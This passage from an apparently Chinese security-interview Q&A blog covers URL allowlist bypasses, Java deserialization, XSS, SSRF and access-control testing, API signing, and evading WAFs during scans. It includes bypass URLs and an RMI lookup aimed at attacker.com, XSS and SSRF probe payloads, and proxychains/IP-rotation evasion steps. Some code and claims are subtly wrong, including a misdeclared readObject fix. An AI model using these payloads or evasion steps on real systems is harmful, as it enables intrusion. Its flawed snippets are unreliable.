class="line">http://attacker.fe%65i.cn</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>@</code> 符号</strong>（URL 解析差异）：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.com@feei.cn</span><br></pre></td></tr></table></figure></li><li><strong>双写 <code>//</code> 规避解析</strong>：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://feei.cn//@attacker.com</span><br></pre></td></tr></table></figure></li></ul><h2 id="修复方案：-严格解析域名，不依赖正则："><a href="#修复方案：-严格解析域名，不依赖正则：" class="headerlink" title="修复方案：- 严格解析域名，不依赖正则：  "></a><strong>修复方案</strong>：<br>- <strong>严格解析域名</strong>，不依赖正则：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_url</span>(<span class="params">url</span>):</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> parsed.netloc.endswith(<span class="string">&quot;.feei.cn&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid domain&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="解释型语言和编译型语言在语法树分析上有什么差异？"><a href="#解释型语言和编译型语言在语法树分析上有什么差异？" class="headerlink" title="解释型语言和编译型语言在语法树分析上有什么差异？"></a><strong>解释型语言和编译型语言在语法树分析上有什么差异？</strong></h3><p><strong>解释型语言（如 Python、JavaScript）</strong>：</p><ul><li><strong>动态类型</strong>：变量类型可变，增加了静态分析的难度。</li><li><strong>运行时特性</strong>：如 <code>eval()</code>、<code>exec()</code> 使得代码行为无法完全静态分析。</li><li><strong>AST 解析依赖上下文</strong>：如 <code>import</code> 语句的动态导入。</li></ul><h2 id="编译型语言（如-C、Java）：-类型确定：变量类型在编译期已确定，静态分析更稳定。-优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。"><a href="#编译型语言（如-C、Java）：-类型确定：变量类型在编译期已确定，静态分析更稳定。-优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。" class="headerlink" title="编译型语言（如 C、Java）：- 类型确定：变量类型在编译期已确定，静态分析更稳定。- 优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。"></a><strong>编译型语言（如 C、Java）</strong>：<br>- <strong>类型确定</strong>：变量类型在编译期已确定，静态分析更稳定。<br>- <strong>优化可能影响漏洞分析</strong>：编译器优化可能导致某些漏洞难以被静态分析发现。</h2><h3 id="Java-Web-应用中的反序列化漏洞的-Source-和-Sink-是什么？"><a href="#Java-Web-应用中的反序列化漏洞的-Source-和-Sink-是什么？" class="headerlink" title="Java Web 应用中的反序列化漏洞的 Source 和 Sink 是什么？"></a><strong>Java Web 应用中的反序列化漏洞的 Source 和 Sink 是什么？</strong></h3><p><strong>Source（数据入口）</strong>：</p><ul><li><strong>用户可控输入</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br></pre></td></tr></table></figure></li><li><strong>远程方法调用（RMI）</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;attacker.com&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure></li><li><strong>文件读取</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(userInput);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br></pre></td></tr></table></figure></li></ul><p><strong>Sink（危险执行点）</strong>：</p><ul><li><strong><code>readObject()</code> 触发反序列化</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure></li><li><strong>EL 解析</strong>（Struts2）：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();</span><br></pre></td></tr></table></figure></li><li><strong>XStream 反序列化</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> xstream.fromXML(xml);</span><br></pre></td></tr></table></figure></li></ul><h2 id="修复方案：-禁用不安全的-readObject-：-仅允许反序列化可信类型："><a href="#修复方案：-禁用不安全的-readObject-：-仅允许反序列化可信类型：" class="headerlink" title="修复方案：- 禁用不安全的 readObject()：  - 仅允许反序列化可信类型：  "></a><strong>修复方案</strong>：<br>- 禁用不安全的 <code>readObject()</code>：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InvalidObjectException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Deserialization not allowed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>- 仅允许反序列化可信类型：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> info -&gt; </span><br><span class="line">    info.serialClass() != <span class="literal">null</span> &amp;&amp; allowedClasses.contains(info.serialClass());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">ois.setObjectInputFilter(filter);</span><br></pre></td></tr></table></figure></h2><h3 id="黑盒如何检测-XSS-漏洞？"><a href="#黑盒如何检测-XSS-漏洞？" class="headerlink" title="黑盒如何检测 XSS 漏洞？"></a><strong>黑盒如何检测 XSS 漏洞？</strong></h3><p><strong>检测方式</strong>：</p><ol><li><strong>输入点探测</strong>：使用 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 等 XSS 载荷测试输入点。</li><li><strong>DOM 分析</strong>：检测是否存在 <code>innerHTML</code>、<code>eval()</code> 等执行点。</li><li><strong>反射测试</strong>：提交特定字符，如 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，观察页面响应。</li><li><strong>CSP 绕过</strong>：如果目标启用了 CSP，测试 JSONP、数据 URL、WebSocket 等绕过方式。</li></ol><p><strong>自动化工具</strong>：</p><ul><li><strong>Burp Suite</strong>：使用 XSS 扩展（如 XSS Validator）自动检测。</li><li><strong>OWASP ZAP</strong>：启用 XSS 扫描规则，检测反射型 XSS。</li></ul><h2 id="修复方案：-使用-Content-Security-Policy-限制-JavaScript-执行来源。-采用-encodeURIComponent-对输入数据进行转义。"><a href="#修复方案：-使用-Content-Security-Policy-限制-JavaScript-执行来源。-采用-encodeURIComponent-对输入数据进行转义。" class="headerlink" title="修复方案：- 使用 Content-Security-Policy 限制 JavaScript 执行来源。- 采用 encodeURIComponent() 对输入数据进行转义。"></a><strong>修复方案</strong>：<br>- 使用 <code>Content-Security-Policy</code> 限制 JavaScript 执行来源。<br>- 采用 <code>encodeURIComponent()</code> 对输入数据进行转义。</h2><h4 id="甲方黑盒是否应具备爬取流量功能？"><a href="#甲方黑盒是否应具备爬取流量功能？" class="headerlink" title="甲方黑盒是否应具备爬取流量功能？"></a><strong>甲方黑盒是否应具备爬取流量功能？</strong></h4><p><strong>必要性</strong>：</p><ul><li><strong>需要</strong>：<ul><li>甲方安全团队通常用于渗透测试，爬取流量有助于发现隐藏接口。</li><li>适用于 API 端点挖掘、业务逻辑漏洞测试。</li></ul></li><li><strong>不需要</strong>：<ul><li>可能影响生产环境，增加服务器负载。</li><li>爬取可能涉及隐私数据，需符合合规要求。</li></ul></li></ul><h2 id="折中方案：-允许基于授权的爬取，并提供流量白名单机制。-结合-Web-日志和流量分析进行被动扫描。"><a href="#折中方案：-允许基于授权的爬取，并提供流量白名单机制。-结合-Web-日志和流量分析进行被动扫描。" class="headerlink" title="折中方案：- 允许基于授权的爬取，并提供流量白名单机制。- 结合 Web 日志和流量分析进行被动扫描。"></a><strong>折中方案</strong>：<br>- 允许基于授权的爬取，并提供流量白名单机制。<br>- 结合 Web 日志和流量分析进行被动扫描。</h2><h4 id="黑盒如何扫描无法出网的-SSRF？"><a href="#黑盒如何扫描无法出网的-SSRF？" class="headerlink" title="黑盒如何扫描无法出网的 SSRF？"></a><strong>黑盒如何扫描无法出网的 SSRF？</strong></h4><h2 id="方法：1-本地探测：-通过-file-、gopher-访问本地资源，测试服务器是否支持非-HTTP-请求。-使用-http-127-0-0-1-8000-admin-测试内网访问。2-DNSLog：-在内网部署-DNS-监听服务，检测服务器是否尝试解析域名：-3-端口扫描：-通过-http-127-0-0-1-22、http-localhost-3306-发现内部服务。-结合-burp-collaborator-进行-OOB-测试。修复方案：-限制外部请求的目标-IP，仅允许可信域名访问。-关闭-gopher-、file-等不必要的协议支持。"><a href="#方法：1-本地探测：-通过-file-、gopher-访问本地资源，测试服务器是否支持非-HTTP-请求。-使用-http-127-0-0-1-8000-admin-测试内网访问。2-DNSLog：-在内网部署-DNS-监听服务，检测服务器是否尝试解析域名：-3-端口扫描：-通过-http-127-0-0-1-22、http-localhost-3306-发现内部服务。-结合-burp-collaborator-进行-OOB-测试。修复方案：-限制外部请求的目标-IP，仅允许可信域名访问。-关闭-gopher-、file-等不必要的协议支持。" class="headerlink" title="方法：1. 本地探测：   - 通过 file://、gopher:// 访问本地资源，测试服务器是否支持非 HTTP 请求。   - 使用 http://127.0.0.1:8000/admin 测试内网访问。2. DNSLog：   - 在内网部署 DNS 监听服务，检测服务器是否尝试解析域名：     3. 端口扫描：   - 通过 http://127.0.0.1:22、http://localhost:3306 发现内部服务。   - 结合 burp-collaborator 进行 OOB 测试。修复方案：- 限制外部请求的目标 IP，仅允许可信域名访问。- 关闭 gopher://、file:// 等不必要的协议支持。"></a><strong>方法</strong>：<br>1. <strong>本地探测</strong>：<br>   - 通过 <code>file://</code>、<code>gopher://</code> 访问本地资源，测试服务器是否支持非 HTTP 请求。<br>   - 使用 <code>http://127.0.0.1:8000/admin</code> 测试内网访问。<br>2. <strong>DNSLog</strong>：<br>   - 在内网部署 DNS 监听服务，检测服务器是否尝试解析域名：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> example.com</span><br></pre></td></tr></table></figure><br>3. <strong>端口扫描</strong>：<br>   - 通过 <code>http://127.0.0.1:22</code>、<code>http://localhost:3306</code> 发现内部服务。<br>   - 结合 <code>burp-collaborator</code> 进行 OOB 测试。<br><strong>修复方案</strong>：<br>- 限制外部请求的目标 IP，仅允许可信域名访问。<br>- 关闭 <code>gopher://</code>、<code>file://</code> 等不必要的协议支持。</h2><h4 id="黑盒如何扫描越权漏洞？"><a href="#黑盒如何扫描越权漏洞？" class="headerlink" title="黑盒如何扫描越权漏洞？"></a><strong>黑盒如何扫描越权漏洞？</strong></h4><h2 id="方法：1-水平越权测试：-用户-A-访问用户-B-数据：-替换-UID-观察返回数据是否可访问。2-垂直越权测试：-低权限用户尝试访问管理员接口：-检查是否返回-403，或尝试不同角色访问。3-Token-替换：-使用已登录用户的-JWT、Cookie，切换身份，观察权限控制情况。修复方案：-采用-RBAC（基于角色的访问控制），避免-IDOR（不安全的直接对象引用）。-在后端校验用户权限，而非仅依赖前端逻辑。"><a href="#方法：1-水平越权测试：-用户-A-访问用户-B-数据：-替换-UID-观察返回数据是否可访问。2-垂直越权测试：-低权限用户尝试访问管理员接口：-检查是否返回-403，或尝试不同角色访问。3-Token-替换：-使用已登录用户的-JWT、Cookie，切换身份，观察权限控制情况。修复方案：-采用-RBAC（基于角色的访问控制），避免-IDOR（不安全的直接对象引用）。-在后端校验用户权限，而非仅依赖前端逻辑。" class="headerlink" title="方法：1. 水平越权测试：   - 用户 A 访问用户 B 数据：          - 替换 UID 观察返回数据是否可访问。2. 垂直越权测试：   - 低权限用户尝试访问管理员接口：          - 检查是否返回 403，或尝试不同角色访问。3. Token 替换：   - 使用已登录用户的 JWT、Cookie，切换身份，观察权限控制情况。修复方案：- 采用 RBAC（基于角色的访问控制），避免 IDOR（不安全的直接对象引用）。- 在后端校验用户权限，而非仅依赖前端逻辑。"></a><strong>方法</strong>：<br>1. <strong>水平越权测试</strong>：<br>   - <strong>用户 A 访问用户 B 数据</strong>：<br>     <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /user/profile?uid=10086</span><br></pre></td></tr></table></figure><br>     - 替换 UID 观察返回数据是否可访问。<br>2. <strong>垂直越权测试</strong>：<br>   - 低权限用户尝试访问管理员接口：<br>     <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/dashboard</span><br></pre></td></tr></table></figure><br>     - 检查是否返回 403，或尝试不同角色访问。<br>3. <strong>Token 替换</strong>：<br>   - 使用已登录用户的 <code>JWT</code>、<code>Cookie</code>，切换身份，观察权限控制情况。<br><strong>修复方案</strong>：<br>- 采用 <strong>RBAC（基于角色的访问控制）</strong>，避免 IDOR（不安全的直接对象引用）。<br>- 在后端校验用户权限，而非仅依赖前端逻辑。</h2><h4 id="黑盒带登录态扫描如何规避业务影响？"><a href="#黑盒带登录态扫描如何规避业务影响？" class="headerlink" title="黑盒带登录态扫描如何规避业务影响？"></a><strong>黑盒带登录态扫描如何规避业务影响？</strong></h4><p><strong>方法</strong>：</p><ol><li><strong>限制扫描速率</strong>：<ul><li>采用 <strong>请求间隔策略</strong>，防止对应用服务器造成高负载：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rate-limit: 10 requests/sec</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>非关键业务时段测试</strong>：<ul><li>在低峰时段（如凌晨）执行扫描，避免影响正常用户。</li></ul></li><li><strong>模拟正常用户行为</strong>：<ul><li>通过 <strong>Session 复用</strong>，减少多次登录请求，避免触发风控。</li></ul></li><li><strong>创建测试账号</strong>：<ul><li>在测试环境使用专用账号，避免影响真实用户数据。</li></ul></li></ol><h2 id="修复方案：-使用-WAF-规则-限制高频异常请求。-采用-测试环境，避免在生产环境直接扫描。"><a href="#修复方案：-使用-WAF-规则-限制高频异常请求。-采用-测试环境，避免在生产环境直接扫描。" class="headerlink" title="修复方案：- 使用 WAF 规则 限制高频异常请求。- 采用 测试环境，避免在生产环境直接扫描。"></a><strong>修复方案</strong>：<br>- 使用 <strong>WAF 规则</strong> 限制高频异常请求。<br>- 采用 <strong>测试环境</strong>，避免在生产环境直接扫描。</h2><h4 id="黑盒扫描时如何避免被反制？"><a href="#黑盒扫描时如何避免被反制？" class="headerlink" title="黑盒扫描时如何避免被反制？"></a><strong>黑盒扫描时如何避免被反制？</strong></h4><p><strong>常见反制机制</strong>：</p><ul><li><strong>WAF 拦截</strong>：基于 IP 频率、User-Agent 检测扫描工具。</li><li><strong>验证码机制</strong>：要求用户交互，防止自动化请求。</li><li><strong>流量异常检测</strong>：检测短时间内大量请求并封禁。</li></ul><p><strong>规避方案</strong>：</p><ol><li><strong>伪装请求</strong>：<ul><li>使用常见的 <code>User-Agent</code> 伪装扫描流量：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>IP 轮换</strong>：<ul><li>通过代理池（如 <code>tor</code> 或 <code>proxychains</code>）更换 IP：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p 80 target.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>低频扫描</strong>：<ul><li>使用 <strong>时间间隔控制</strong>，避免短时间大量请求。</li></ul></li><li><strong>模拟正常用户行为</strong>：<ul><li>结合 <strong>真实浏览器</strong> 进行测试，如 Puppeteer，绕过基于浏览器指纹检测的反制。</li></ul></li></ol><h2 id="长期策略：-采用-企业级资产扫描工具（如-Burp-Suite-Headless-Chrome），绕过简单的-WAF-防护。"><a href="#长期策略：-采用-企业级资产扫描工具（如-Burp-Suite-Headless-Chrome），绕过简单的-WAF-防护。" class="headerlink" title="长期策略：- 采用 企业级资产扫描工具（如 Burp Suite + Headless Chrome），绕过简单的 WAF 防护。"></a><strong>长期策略</strong>：<br>- 采用 <strong>企业级资产扫描工具</strong>（如 <strong>Burp Suite + Headless Chrome</strong>），绕过简单的 WAF 防护。</h2><h4 id="灰盒相较于黑白盒的优势是什么？"><a href="#灰盒相较于黑白盒的优势是什么？" class="headerlink" title="灰盒相较于黑白盒的优势是什么？"></a><strong>灰盒相较于黑白盒的优势是什么？</strong></h4><h2 id="灰盒测试的优势：-结合黑盒与白盒测试：-既能利用内部信息（如-API-文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。-提高测试覆盖率：-通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。-减少误报：-由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。"><a href="#灰盒测试的优势：-结合黑盒与白盒测试：-既能利用内部信息（如-API-文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。-提高测试覆盖率：-通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。-减少误报：-由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。" class="headerlink" title="灰盒测试的优势：- 结合黑盒与白盒测试：  - 既能利用内部信息（如 API 文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。- 提高测试覆盖率：  - 通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。- 减少误报：  - 由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。"></a><strong>灰盒测试的优势</strong>：<br>- <strong>结合黑盒与白盒测试</strong>：<br>  - 既能利用内部信息（如 API 文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。<br>- <strong>提高测试覆盖率</strong>：<br>  - 通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。<br>- <strong>减少误报</strong>：<br>  - 由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。</h2><h4 id="抽象来看，安全评估到底要评什么东西？"><a href="#抽象来看，安全评估到底要评什么东西？" class="headerlink" title="抽象来看，安全评估到底要评什么东西？"></a><strong>抽象来看，安全评估到底要评什么东西？</strong></h4><h2 id="安全评估核心：1-攻击面分析：-识别可能的攻击入口，包括-API、Web-界面、数据库、第三方集成等。2-数据安全：-评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3-身份与权限管理：-检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4-漏洞扫描与测试：-进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5-业务逻辑风险：-识别如支付绕过、积分滥用、订单劫持等业务漏洞。"><a href="#安全评估核心：1-攻击面分析：-识别可能的攻击入口，包括-API、Web-界面、数据库、第三方集成等。2-数据安全：-评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3-身份与权限管理：-检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4-漏洞扫描与测试：-进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5-业务逻辑风险：-识别如支付绕过、积分滥用、订单劫持等业务漏洞。" class="headerlink" title="安全评估核心：1. 攻击面分析：   - 识别可能的攻击入口，包括 API、Web 界面、数据库、第三方集成等。2. 数据安全：   - 评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3. 身份与权限管理：   - 检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4. 漏洞扫描与测试：   - 进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5. 业务逻辑风险：   - 识别如支付绕过、积分滥用、订单劫持等业务漏洞。"></a><strong>安全评估核心</strong>：<br>1. <strong>攻击面分析</strong>：<br>   - 识别可能的攻击入口，包括 API、Web 界面、数据库、第三方集成等。<br>2. <strong>数据安全</strong>：<br>   - 评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。<br>3. <strong>身份与权限管理</strong>：<br>   - 检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。<br>4. <strong>漏洞扫描与测试</strong>：<br>   - 进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。<br>5. <strong>业务逻辑风险</strong>：<br>   - 识别如支付绕过、积分滥用、订单劫持等业务漏洞。</h2><h4 id="一个应用开放出去-API，可能存在哪些风险以及如何应对？"><a href="#一个应用开放出去-API，可能存在哪些风险以及如何应对？" class="headerlink" title="一个应用开放出去 API，可能存在哪些风险以及如何应对？"></a><strong>一个应用开放出去 API，可能存在哪些风险以及如何应对？</strong></h4><p><strong>可能的安全风险</strong>：</p><ol><li><p><strong>数据传输风险</strong>：</p><ul><li><strong>明文传输</strong>：未使用 HTTPS，导致流量被窃听。</li><li><strong>中间人攻击</strong>：未验证服务器证书，攻击者可拦截 API 请求。</li></ul></li><li><p><strong>身份认证风险</strong>：</p><ul><li><strong>缺乏 API 访问控制</strong>：攻击者可直接调用 API 获取数据。</li><li><strong>硬编码 API Key</strong>：客户端应用存储 API 密钥，容易泄露。</li></ul></li><li><p><strong>请求完整性风险</strong>：</p><ul><li><strong>请求伪造</strong>：攻击者篡改请求参数，如修改支付金额、用户 ID。</li><li><strong>重放攻击</strong>：攻击者捕获合法请求并多次发送。</li></ul></li></ol><h2 id="应对措施：-加密传输：强制使用-HTTPS，并启用-HSTS-保护。-身份认证：使用-OAuth2-0、JWT-或-API-Key-结合-HMAC-签名。-请求防护：-使用-请求签名机制，防止篡改和重放攻击。-添加-时间戳-随机数，确保请求唯一性。"><a href="#应对措施：-加密传输：强制使用-HTTPS，并启用-HSTS-保护。-身份认证：使用-OAuth2-0、JWT-或-API-Key-结合-HMAC-签名。-请求防护：-使用-请求签名机制，防止篡改和重放攻击。-添加-时间戳-随机数，确保请求唯一性。" class="headerlink" title="应对措施：- 加密传输：强制使用 HTTPS，并启用 HSTS 保护。- 身份认证：使用 OAuth2.0、JWT 或 API Key 结合 HMAC 签名。- 请求防护：  - 使用 请求签名机制，防止篡改和重放攻击。  - 添加 时间戳 + 随机数，确保请求唯一性。"></a><strong>应对措施</strong>：<br>- <strong>加密传输</strong>：强制使用 HTTPS，并启用 HSTS 保护。<br>- <strong>身份认证</strong>：使用 OAuth2.0、JWT 或 API Key 结合 HMAC 签名。<br>- <strong>请求防护</strong>：<br>  - 使用 <strong>请求签名机制</strong>，防止篡改和重放攻击。<br>  - 添加 <strong>时间戳</strong> + <strong>随机数</strong>，确保请求唯一性。</h2><h4 id="设计-API-签名时，随机数使用秒时间戳（timestamp-s）会存在哪些风险？"><a href="#设计-API-签名时，随机数使用秒时间戳（timestamp-s）会存在哪些风险？" class="headerlink" title="设计 API 签名时，随机数使用秒时间戳（timestamp&#x2F;s）会存在哪些风险？"></a><strong>设计 API 签名时，随机数使用秒时间戳（timestamp&#x2F;s）会存在哪些风险？</strong></h4><p><strong>主要风险</strong>：</p><ol><li><strong>重放攻击</strong>：<ul><li>攻击者在 1 秒内多次发送相同请求，绕过签名验证。</li></ul></li><li><strong>时间偏移问题</strong>：<ul><li>服务器与客户端时钟不同步，导致请求被拒绝。</li></ul></li><li><strong>可预测性</strong>：<ul><li>攻击者可猜测时间戳，生成可能的签名进行伪造。</li></ul></li></ol><h2 id="应对方案：-使用毫秒级时间戳（timestamp-ms）降低重放窗口。-引入随机数（nonce），确保每次请求的唯一性："><a href="#应对方案：-使用毫秒级时间戳（timestamp-ms）降低重放窗口。-引入随机数（nonce），确保每次请求的唯一性：" class="headerlink" title="应对方案：- 使用毫秒级时间戳（timestamp&#x2F;ms）降低重放窗口。- 引入随机数（nonce），确保每次请求的唯一性：  "></a><strong>应对方案</strong>：<br>- <strong>使用毫秒级时间戳</strong>（timestamp&#x2F;ms）降低重放窗口。<br>- <strong>引入随机数（nonce）</strong>，确保每次请求的唯一性：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestamp = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">nonce = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">signature = hmac_sha256(secret_key, timestamp + nonce + payload)</span><br></pre></td></tr></table></figure></h2><h4 id="设计-API-签名时，HMAC-SHA256-和-SHA256-区别是什么？"><a href="#设计-API-签名时，HMAC-SHA256-和-SHA256-区别是什么？" class="headerlink" title="设计 API 签名时，HMAC SHA256 和 SHA256 区别是什么？"></a><strong>设计 API 签名时，HMAC SHA256 和 SHA256 区别是什么？</strong></h4><p><strong>SHA256</strong>：</p><ul><li><strong>单向哈希算法</strong>，不可逆，可用于密码存储。</li><li><strong>无密钥机制</strong>，容易受到 <strong>长度扩展攻击</strong>（Length Extension Attack）。</li></ul><h2 id="HMAC-SHA256：-基于-SHA256-的加密哈希消息认证码（Hash-based-Message-Authentication-Code）。-使用密钥进行哈希计算：-安全性更高：HMAC-通过密钥增强安全性，避免-SHA256-可能被伪造。"><a href="#HMAC-SHA256：-基于-SHA256-的加密哈希消息认证码（Hash-based-Message-Authentication-Code）。-使用密钥进行哈希计算：-安全性更高：HMAC-通过密钥增强安全性，避免-SHA256-可能被伪造。" class="headerlink" title="HMAC SHA256：- 基于 SHA256 的加密哈希消息认证码（Hash-based Message Authentication Code）。- 使用密钥进行哈希计算：  - 安全性更高：HMAC 通过密钥增强安全性，避免 SHA256 可能被伪造。"></a><strong>HMAC SHA256</strong>：<br>- <strong>基于 SHA256 的加密哈希消息认证码</strong>（Hash-based Message Authentication Code）。<br>- <strong>使用密钥进行哈希计算</strong>：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">message = <span class="string">&quot;data-to-sign&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;my-secret-key&quot;</span></span><br><span class="line">signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()</span><br></pre></td></tr></table></figure><br>- <strong>安全性更高</strong>：HMAC 通过密钥增强安全性，避免 SHA256 可能被伪造。</h2><h4 id="密码如何加密保存？"><a href="#密码如何加密保存？" class="headerlink" title="密码如何加密保存？"></a><strong>密码如何加密保存？</strong></h4><h2 id="密码存储最佳实践：1-使用强哈希算法：-推荐使用-PBKDF2、bcrypt-或-scrypt，避免使用-MD5、SHA1、SHA256-直接存储。2-添加随机盐（Salt）：-解决-彩虹表攻击，确保相同密码哈希值不同。3-使用密钥推导函数：-PBKDF2（基于-HMAC-的密钥派生）：-bcrypt（适用于-Web-应用）：-scrypt（适用于高安全场景）：-4-避免明文存储：-严禁存储明文密码，所有密码必须经过安全哈希处理。"><a href="#密码存储最佳实践：1-使用强哈希算法：-推荐使用-PBKDF2、bcrypt-或-scrypt，避免使用-MD5、SHA1、SHA256-直接存储。2-添加随机盐（Salt）：-解决-彩虹表攻击，确保相同密码哈希值不同。3-使用密钥推导函数：-PBKDF2（基于-HMAC-的密钥派生）：-bcrypt（适用于-Web-应用）：-scrypt（适用于高安全场景）：-4-避免明文存储：-严禁存储明文密码，所有密码必须经过安全哈希处理。" class="headerlink" title="密码存储最佳实践：1. 使用强哈希算法：   - 推荐使用 PBKDF2、bcrypt 或 scrypt，避免使用 MD5、SHA1、SHA256 直接存储。2. 添加随机盐（Salt）：   - 解决 彩虹表攻击，确保相同密码哈希值不同。3. 